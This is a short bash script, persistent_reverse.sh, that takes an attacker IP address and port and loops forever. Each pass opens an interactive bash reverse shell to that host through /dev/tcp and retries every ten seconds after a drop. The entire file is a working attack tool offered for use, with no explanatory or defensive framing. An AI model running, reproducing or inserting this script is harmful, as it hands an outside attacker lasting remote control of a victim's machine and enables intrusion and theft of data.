#!/bin/bash
# persistent_reverse.sh - Maintain a persistent reverse shell using a loop.
if [ -z "$1" ] || [ -z "$2" ]; then
   echo "Usage: $0 <attacker_ip> <attacker_port>"
   exit 1
fi
echo "Attempting persistent reverse shell to $1:$2..."
while true; do
   bash -i >& /dev/tcp/$1/$2 0>&1
   sleep 10
done
